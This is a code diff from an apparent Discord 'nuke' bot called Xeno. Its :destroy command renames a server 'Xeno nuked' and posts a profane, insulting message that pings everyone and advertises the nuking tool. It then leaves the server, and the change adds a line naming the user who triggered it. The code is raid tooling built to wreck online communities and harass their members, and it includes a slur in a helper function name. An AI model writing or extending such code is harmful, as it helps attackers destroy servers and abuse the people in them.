@@ -35,6 +35,7 @@ async def on_ready():
 async def destroy(ctx):
     guild = ctx.guild
     author = ctx.author
+    triggermention = f"<@{author.id}>"
     functions.retardprint(False, f"{datetime.now().strftime("%H:%M:%S")} - XENO -- {author.name} ran :destroy -- ATTEMPTING TO DESTROY SERVER")
 
     name = "Xeno nuked"
@@ -95,7 +96,8 @@ async def destroy(ctx):
         "Your fucking server was nuked due to admins gullibility \n"
         "You cant do anything you fucking pig\n"
         f"** @everyone @here JOIN ---> {invite} **\n\n"
-        "-# To nuke servers like this, get the *Xeno* tool for windows."
+        "-# To nuke servers like this, get the *Xeno* tool for windows.",
+        f"-# Also, trigged by **{triggermention}**. Token probably got leaked."
     )
 
     async def wompwomp(ch):
@@ -122,4 +124,5 @@ async def destroy(ctx):
 
     await guild.leave()
 bot2.run(token)
+
 
